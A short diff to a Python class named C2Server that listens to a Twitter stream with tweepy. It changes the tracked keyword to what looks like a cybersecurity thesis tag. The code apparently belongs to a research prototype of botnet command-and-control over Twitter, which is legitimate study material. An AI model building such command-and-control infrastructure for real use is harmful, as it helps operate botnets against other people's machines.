@@ -15,7 +15,7 @@ class C2Server(tweepy.StreamListener):
         Thread(target = self.register_bot).start()
 
         self.tweet_stream = tweepy.Stream(self.api.auth, self)
-        self.tweet_stream.filter(track=['mariconnors'], is_async=True)
+        self.tweet_stream.filter(track=['egs_tfm_ciberseg'], is_async=True)
 
     def __initialize_api(self):
         self.__print_separator()
